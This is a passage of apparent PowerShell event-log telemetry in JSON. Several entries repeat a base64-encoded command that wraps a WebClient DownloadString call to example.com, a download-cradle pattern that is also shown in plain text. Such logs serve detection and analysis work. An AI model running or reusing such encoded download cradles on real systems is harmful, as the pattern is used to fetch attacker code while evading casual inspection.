AkAGoAbwBiACAALQBUAGkAbQBlAG8AdQB0ACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAKQAgAHsACgAgACAAIAAgACAAIAAgACAAJABvAHUAdABwAHUAdAAgAD0AIABSAGUAYwBlAGkAdgBlAC0ASgBvAGIAIAAtAEoAbwBiACAAJABqAG8AYgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAbwB1AHQAIAA9ACAAKAAkAG8AdQB0AHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAuAFQAcgBpAG0AKAApAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABqAG8AYgAuAFMAdABhAHQAZQAgAC0AZQBxACAAJwBGAGEAaQBsAGUAZAAnACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFMAdABkAGUAcgByACAAPQAgACQAagBvAGIALgBDAGgAaQBsAGQASgBvAGIAcwBbADAAXQAuAEoAbwBiAFMAdABhAHQAZQBJAG4AZgBvAC4AUgBlAGEAcwBvAG4ALgBNAGUAcwBzAGEAZwBlAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAAMQAKACAAIAAgACAAIAAgACAAIAB9ACAAZQBsAHMAZQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAwAAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBDAG8AbQBtAGEAbgBkACAAdABpAG0AZQBkACAAbwB1AHQAIABvAG4AIAB0AGgAZQAgAHMAZQByAHYAZQByACAAYQBmAHQAZQByACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAIABzAGUAYwBvAG4AZABzAC4AIgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxADIANAAKACAAIAAgACAAfQAKAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBXAHIAYQBwAHAAZQByACAAUwBjAHIAaQBwAHQAIABFAHIAcgBvAHIAOgAgACQAKAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAKQAiAAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxAAoAfQAgAGYAaQBuAGEAbABsAHkAIAB7AAoAIAAgACAAIABpAGYAIAAoACQAagBvAGIAKQAgAHsACgAgACAAIAAgACAAIAAgACAAUwB0AG8AcAAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUACgAgACAAIAAgACAAIAAgACAAUgBlAG0AbwB2AGUALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAALQBGAG8AcgBjAGUACgAgACAAIAAgAH0ACgB9AAoAJAByAGUAcwB1AGwAdAAgAHwAIABDAG8AbgB2AGUAcgB0AFQAbwAtAEoAcwBvAG4AIAAtAEMAbwBtAHAAcgBlAHMAcwAKAA=="
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "powershell.exe -EncodedCommand CgAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACAAPQAgAEAAJwAKACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAeABhAG0AcABsAGUALgBjAG8AbQAnACkACgAnAEAACgAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgAD0AIAAyADUACgAkAHIAZQBzAHUAbAB0ACAAPQAgAEAAewAKACAAIAAgACAAUwB0AGQAbwB1AHQAIAA9ACAAIgAiAAoAIAAgACAAIABTAHQAZABlAHIAcgAgAD0AIAAiACIACgAgACAAIAAgAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAALQAxAAoAfQAKAHQAcgB5ACAAewAKACAAIAAgACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsAIAA9ACAAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACkACgAgACAAIAAgACQAagBvAGIAIAA9ACAAUwB0AGEAcgB0AC0ASgBvAGIAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgACQAcwBjAHIAaQBwAHQAQgBsAG8AYwBrAAoAIAAgACAAIABpAGYAIAAoAFcAYQBpAHQALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBUAGkAbQBlAG8AdQB0ACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAKQAgAHsACgAgACAAIAAgACAAIAAgACAAJABvAHUAdABwAHUAdAAgAD0AIABSAGUAYwBlAGkAdgBlAC0ASgBvAGIAIAAtAEoAbwBiACAAJABqAG8AYgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAbwB1AHQAIAA9ACAAKAAkAG8AdQB0AHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAuAFQAcgBpAG0AKAApAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABqAG8AYgAuAFMAdABhAHQAZQAgAC0AZQBxACAAJwBGAGEAaQBsAGUAZAAnACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFMAdABkAGUAcgByACAAPQAgACQAagBvAGIALgBDAGgAaQBsAGQASgBvAGIAcwBbADAAXQAuAEoAbwBiAFMAdABhAHQAZQBJAG4AZgBvAC4AUgBlAGEAcwBvAG4ALgBNAGUAcwBzAGEAZwBlAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAAMQAKACAAIAAgACAAIAAgACAAIAB9ACAAZQBsAHMAZQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAwAAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBDAG8AbQBtAGEAbgBkACAAdABpAG0AZQBkACAAbwB1AHQAIABvAG4AIAB0AGgAZQAgAHMAZQByAHYAZQByACAAYQBmAHQAZQByACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAIABzAGUAYwBvAG4AZABzAC4AIgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxADIANAAKACAAIAAgACAAfQAKAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBXAHIAYQBwAHAAZQByACAAUwBjAHIAaQBwAHQAIABFAHIAcgBvAHIAOgAgACQAKAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAKQAiAAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxAAoAfQAgAGYAaQBuAGEAbABsAHkAIAB7AAoAIAAgACAAIABpAGYAIAAoACQAagBvAGIAKQAgAHsACgAgACAAIAAgACAAIAAgACAAUwB0AG8AcAAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUACgAgACAAIAAgACAAIAAgACAAUgBlAG0AbwB2AGUALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAALQBGAG8AcgBjAGUACgAgACAAIAAgAH0ACgB9AAoAJAByAGUAcwB1AGwAdAAgAHwAIABDAG8AbgB2AGUAcgB0AFQAbwAtAEoAcwBvAG4AIAAtAEMAbwBtAHAAcgBlAHMAcwAKAA=="
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8197,
      "details": "Runspace state changed to Closed"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8197,
      "details": "Runspace state changed to Closing"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 12039,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8196,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 12039,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8196,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4104,
      "details": "(New-Object System.Net.WebClient).DownloadString('http://example.com')"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 12039,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8196,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8197,
      "details": "Runspace state changed to Opened"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 12039,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8196,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 53504,
      "details": "Windows PowerShell has started an IPC listening thread on process: 8524 in AppDomain: DefaultAppDomain."
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 12039,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8196,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "powershell.exe -EncodedCommand CgAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACAAPQAgAEAAJwAKACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAeABhAG0AcABsAGUALgBjAG8AbQAnACkACgAnAEAACgAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgAD0AIAAyADUACgAkAHIAZQBzAHUAbAB0ACAAPQAgAEAAewAKACAAIAAgACAAUwB0AGQAbwB1AHQAIAA9ACAAIgAiAAoAIAAgACAAIABTAHQAZABlAHIAcgAgAD0AIAAiACIACgAgACAAIAAgAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAALQAxAAoAfQAKAHQAcgB5ACAAewAKACAAIAAgACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsAIAA9ACAAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACkACgAgACAAIAAgACQAagBvAGIAIAA9ACAAUwB0AGEAcgB0AC0ASgBvAGIAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgACQAcwBjAHIAaQBwAHQAQgBsAG8AYwBrAAoAIAAgACAAIABpAGYAIAAoAFcAYQBpAHQALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBUAGkAbQBlAG8AdQB0ACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAKQAgAHsACgAgACAAIAAgACAAIAAgACAAJABvAHUAdABwAHUAdAAgAD0AIABSAGUAYwBlAGkAdgBlAC0ASgBvAGIAIAAtAEoAbwBiACAAJABqAG8AYgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAbwB1AHQAIAA9ACAAKAAkAG8AdQB0AHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAuAFQAcgBpAG0AKAApAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABqAG8AYgAuAFMAdABhAHQAZQAgAC0AZQBxACAAJwBGAGEAaQBsAGUAZAAnACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFMAdABkAGUAcgByACAAPQAgACQAagBvAGIALgBDAGgAaQBsAGQASgBvAGIAcwBbADAAXQAuAEoAbwBiAFMAdABhAHQAZQBJAG4AZgBvAC4AUgBlAGEAcwBvAG4ALgBNAGUAcwBzAGEAZwBlAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAAMQAKACAAIAAgACAAIAAgACAAIAB9ACAAZQBsAHMAZQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAwAAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBDAG8AbQBtAGEAbgBkACAAdABpAG0AZQBkACAAbwB1AHQAIABvAG4AIAB0AGgAZQAgAHMAZQByAHYAZQByACAAYQBmAHQAZQByACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAIABzAGUAYwBvAG4AZABzAC4AIgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxADIANAAKACAAIAAgACAAfQAKAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBXAHIAYQBwAHAAZQByACAAUwBjAHIAaQBwAHQAIABFAHIAcgBvAHIAOgAgACQAKAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAKQAiAAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxAAoAfQAgAGYAaQBuAGEAbABsAHkAIAB7AAoAIAAgACAAIABpAGYAIAAoACQAagBvAGIAKQAgAHsACgAgACAAIAAgACAAIAAgACAAUwB0AG8AcAAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUACgAgACAAIAAgACAAIAAgACAAUgBlAG0AbwB2AGUALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAALQBGAG8AcgBjAGUACgAgACAAIAAgAH0ACgB9AAoAJAByAGUAcwB1AGwAdAAgAHwAIABDAG8AbgB2AGUAcgB0AFQAbwAtAEoAcwBvAG4AIAAtAEMAbwBtAHAAcgBlAHMAcwAKAA=="
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 40961,
      "details": "PowerShell console is starting up"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8197,
      "details": "Runspace state changed to Opening"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8195,
      "details": "Opening RunspacePool"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8194,
      "details": "Creating RunspacePool object \r\n \t InstanceId 45c522ed-bbca-45d7-ae33-2c4266fecaaa \r\n \t MinRunspaces 1 \r\n \t MaxRunspaces 1"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8193,
      "details": "Creating Runspace object \r\n \t Instance Id: 17261293-d88a-4878-a6b2-f379f78d4a59"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "powershell.exe -EncodedCommand CgAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACAAPQAgAEAAJwAKACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAeABhAG0AcABsAGUALgBjAG8AbQAnACkACgAnAEAACgAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgAD0AIAAyADUACgAkAHIAZQBzAHUAbAB0ACAAPQAgAEAAewAKACAAIAAgACAAUwB0AGQAbwB1AHQAIAA9ACAAIgAiAAoAIAAgACAAIABTAHQAZABlAHIAcgAgAD0AIAAiACIACgAgACAAIAAgAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAALQAxAAoAfQAKAHQAcgB5ACAAewAKACAAIAAgACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsAIAA9ACAAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACkACgAgACAAIAAgACQAagBvAGIAIAA9ACAAUwB0AGEAcgB0AC0ASgBvAGIAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgACQAcwBjAHIAaQBwAHQAQgBsAG8AYwBrAAoAIAAgACAAIABpAGYAIAAoAFcAYQBpAHQALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBUAGkAbQBlAG8AdQB0ACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAKQAgAHsACgAgACAAIAAgACAAIAAgACAAJABvAHUAdABwAHUAdAAgAD0AIABSAGUAYwBlAGkAdgBlAC0ASgBvAGIAIAAtAEoAbwBiACAAJABqAG8AYgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAbwB1AHQAIAA9ACAAKAAkAG8AdQB0AHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAuAFQAcgBpAG0AKAApAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABqAG8AYgAuAFMAdABhAHQAZQAgAC0AZQBxACAAJwBGAGEAaQBsAGUAZAAnACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFMAdABkAGUAcgByACAAPQAgACQAagBvAGIALgBDAGgAaQBsAGQASgBvAGIAcwBbADAAXQAuAEoAbwBiAFMAdABhAHQAZQBJAG4AZgBvAC4AUgBlAGEAcwBvAG4ALgBNAGUAcwBzAGEAZwBlAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAAMQAKACAAIAAgACAAIAAgACAAIAB9ACAAZQBsAHMAZQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAwAAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBDAG8AbQBtAGEAbgBkACAAdABpAG0AZQBkACAAbwB1AHQAIABvAG4AIAB0AGgAZQAgAHMAZQByAHYAZQByACAAYQBmAHQAZQByACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAIABzAGUAYwBvAG4AZABzAC4AIgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxADIANAAKACAAIAAgACAAfQAKAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBXAHIAYQBwAHAAZQByACAAUwBjAHIAaQBwAHQAIABFAHIAcgBvAHIAOgAgACQAKAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAKQAiAAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxAAoAfQAgAGYAaQBuAGEAbABsAHkAIAB7AAoAIAAgACAAIABpAGYAIAAoACQAagBvAGIAKQAgAHsACgAgACAAIAAgACAAIAAgACAAUwB0AG8AcAAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUACgAgACAAIAAgACAAIAAgACAAUgBlAG0AbwB2AGUALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAALQBGAG8AcgBjAGUACgAgACAAIAAgAH0ACgB9AAoAJAByAGUAcwB1AGwAdAAgAHwAIABDAG8AbgB2AGUAcgB0AFQAbwAtAEoAcwBvAG4AIAAtAEMAbwBtAHAAcgBlAHMAcwAKAA=="
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "powershell.exe -EncodedCommand CgAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACAAPQAgAEAAJwAKACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAeABhAG0AcABsAGUALgBjAG8AbQAnACkACgAnAEAACgAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgAD0AIAAyADUACgAkAHIAZQBzAHUAbAB0ACAAPQAgAEAAewAKACAAIAAgACAAUwB0AGQAbwB1AHQAIAA9ACAAIgAiAAoAIAAgACAAIABTAHQAZABlAHIAcgAgAD0AIAAiACIACgAgACAAIAAgAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAALQAxAAoAfQAKAHQAcgB5ACAAewAKACAAIAAgACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsAIAA9ACAAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACkACgAgACAAIAAgACQAagBvAGIAIAA9ACAAUwB0AGEAcgB0AC0ASgBvAGIAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgACQAcwBjAHIAaQBwAHQAQgBsAG8AYwBrAAoAIAAgACAAIABpAGYAIAAoAFcAYQBpAHQALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBUAGkAbQBlAG8AdQB0ACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAKQAgAHsACgAgACAAIAAgACAAIAAgACAAJABvAHUAdABwAHUAdAAgAD0AIABSAGUAYwBlAGkAdgBlAC0ASgBvAGIAIAAtAEoAbwBiACAAJABqAG8AYgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAbwB1AHQAIAA9ACAAKAAkAG8AdQB0AHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAuAFQAcgBpAG0AKAApAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABqAG8AYgAuAFMAdABhAHQAZQAgAC0AZQBxACAAJwBGAGEAaQBsAGUAZAAnACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFMAdABkAGUAcgByACAAPQAgACQAagBvAGIALgBDAGgAaQBsAGQASgBvAGIAcwBbADAAXQAuAEoAbwBiAFMAdABhAHQAZQBJAG4AZgBvAC4AUgBlAGEAcwBvAG4ALgBNAGUAcwBzAGEAZwBlAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAAMQAKACAAIAAgACAAIAAgACAAIAB9ACAAZQBsAHMAZQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAwAAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBDAG8AbQBtAGEAbgBkACAAdABpAG0AZQBkACAAbwB1AHQAIABvAG4AIAB0AGgAZQAgAHMAZQByAHYAZQByACAAYQBmAHQAZQByACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAIABzAGUAYwBvAG4AZABzAC4AIgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxADIANAAKACAAIAAgACAAfQAKAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBXAHIAYQBwAHAAZQByACAAUwBjAHIAaQBwAHQAIABFAHIAcgBvAHIAOgAgACQAKAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAKQAiAAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxAAoAfQAgAGYAaQBuAGEAbABsAHkAIAB7AAoAIAAgACAAIABpAGYAIAAoACQAagBvAGIAKQAgAHsACgAgACAAIAAgACAAIAAgACAAUwB0AG8AcAAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUACgAgACAAIAAgACAAIAAgACAAUgBlAG0AbwB2AGUALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAALQBGAG8AcgBjAGUACgAgACAAIAAgAH0ACgB9AAoAJAByAGUAcwB1AGwAdAAgAHwAIABDAG8AbgB2AGUAcgB0AFQAbwAtAEoAcwBvAG4AIAAtAEMAbwBtAHAAcgBlAHMAcwAKAA=="
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4104,
